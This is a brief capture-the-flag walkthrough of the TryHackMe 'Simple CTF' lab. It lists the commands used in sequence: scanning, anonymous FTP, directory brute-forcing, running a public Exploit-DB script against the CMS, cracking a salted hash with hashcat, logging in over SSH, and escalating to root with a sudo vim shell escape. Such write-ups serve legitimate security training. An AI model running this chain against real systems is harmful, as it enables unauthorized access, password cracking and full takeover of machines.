# THM - Simple CTF

```shell
nmap -A 10.10.56.179

ftp 10.10.56.179
	anonymous
		ls
		cd pub
		mget *
		bye

http://10.10.56.179/robots.txt

gobuster dir -w KaliWordLists/dirbuster/directory-list-2.3-small.txt -u http://10.10.56.179
```

http://10.10.56.179/simple

https://www.exploit-db.com/exploits/46635

```shell
python2 -m pip install requests
python2 -m pip install termcolor

python2 46635.py -u http://10.10.56.179/simple
```

> Salt for password found: 1dac0d92e9fa6bb2
> 

```shell
hashcat -O -a 0 -m 10 :1dac0d92e9fa6bb2 KaliWordLists/rockyou.txt

hashcat -O -a 0 -m 10 :1dac0d92e9fa6bb2 KaliWordLists/rockyou.txt
```

> secret

```shell
ssh mitch@10.10.56.179 -p 2222
	yes
	secret
		ls
		cat user.txt
		
		ls /home
		
		sudo -l
		
		sudo vim -c ':!/bin/sh'		# https://gtfobins.github.io/gtfobins/vim/#sudo
			whoami
			
			ls /root
			cat /root/root.txt
```
